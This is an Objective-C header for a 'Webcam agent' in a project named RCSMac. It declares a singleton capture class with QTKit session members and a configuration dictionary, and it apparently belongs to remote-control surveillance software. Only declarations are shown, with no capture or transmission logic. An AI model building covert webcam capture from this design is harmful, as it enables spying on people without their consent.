/*
 * RCSMac - Webcam agent
 * 
 * Created by Massimo Chiodini on 05/08/2009
 *  Refactored by Alfredo Pesoli on 16/09/2009
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>
#import <QTKit/QTKit.h>

#import "RCSMLogManager.h"

// Massimo Chiodini - 05/08/2009
typedef struct _webcam {
  u_int sleepTime;
  u_int numOfFrame; // 1 Window - 0 Entire Desktop
} webcamStruct;
// End of Chiodo


@interface __m_MAgentWebcam : NSObject <Agents> 
{
@private
  BOOL                              mImageGrabbed;
  QTCaptureDevice                   *mDevice; 
  QTCaptureSession                  *mCaptureSession;
  QTCaptureDeviceInput              *mCaptureDeviceInput;
  QTCaptureDecompressedVideoOutput  *mCaptureDecompressedVideoOutput;
  CVImageBufferRef                  mCurrentImageBuffer;  
  NSMutableDictionary               *mAgentConfiguration;
  
}

+ (__m_MAgentWebcam *)sharedInstance;

- (id)copyWithZone: (NSZone *)aZone;
+ (id)allocWithZone: (NSZone *)aZone;

- (unsigned)retainCount;
- (id)retain;
- (id)init;

- (void)release;
- (id)autorelease;

- (NSMutableDictionary *)mAgentConfiguration;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;

@end
